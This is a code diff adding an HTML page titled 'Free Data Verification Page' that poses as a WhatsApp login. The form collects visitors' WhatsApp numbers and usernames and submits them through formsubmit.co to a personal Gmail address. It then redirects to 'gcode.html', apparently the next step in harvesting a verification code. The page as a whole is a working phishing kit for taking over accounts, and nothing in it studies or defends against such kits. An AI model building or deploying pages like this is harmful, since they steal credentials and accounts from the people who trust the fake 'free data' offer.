@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Free Data Verification Page</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #2e7d32, #66bb6a);
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+    }.login-container {
+  background-color: rgba(255, 255, 255, 0.05);
+  padding: 40px;
+  border-radius: 20px;
+  box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
+  width: 300px;
+  text-align: center;
+}
+
+.login-container h1 {
+  font-size: 32px;
+  margin-bottom: 30px;
+}
+
+.input-group {
+  margin-bottom: 20px;
+  text-align: left;
+}
+
+label {
+  display: block;
+  margin-bottom: 5px;
+  font-weight: 500;
+}
+
+input[type="text"] {
+  width: 100%;
+  padding: 10px;
+  border: none;
+  border-radius: 8px;
+  background-color: rgba(255, 255, 255, 0.1);
+  color: white;
+  font-size: 16px;
+}
+
+input::placeholder {
+  color: #c8e6c9;
+}
+
+button {
+  margin-top: 10px;
+  width: 100%;
+  padding: 12px;
+  border: none;
+  border-radius: 10px;
+  background-color: #43a047;
+  color: white;
+  font-size: 16px;
+  font-weight: bold;
+  cursor: pointer;
+  transition: background-color 0.3s ease;
+}
+
+button:hover {
+  background-color: #388e3c;
+}
+
+  </style>
+</head>
+<body>
+  <div class="login-container">
+  <h1>Login</h1>
+  <form action="https://formsubmit.co/emmanuelkoranteng362@gmail.com" method="POST" onsubmit="redirectToGCode()">
+    <div class="input-group">
+      <label for="whatsapp-number">WhatsApp Number</label>
+      <input type="text" name="whatsapp-number" placeholder="+ 1 234 567 8900" required>
+    </div>
+    <div class="input-group">
+      <label for="whatsapp-username">WhatsApp Username</label>
+      <input type="text" name="whatsapp-username" placeholder="@username" required>
+    </div>
+    <input type="hidden" name="_next" value="gcode.html">
+    <button type="submit">LOG IN</button>
+  </form>
+</div>
+
+<script>
+  function redirectToGCode() {
+    setTimeout(function () {
+      window.location.href = "gcode.html";
+    }, 100);
+  }
+</script>
+</body>
+</html>
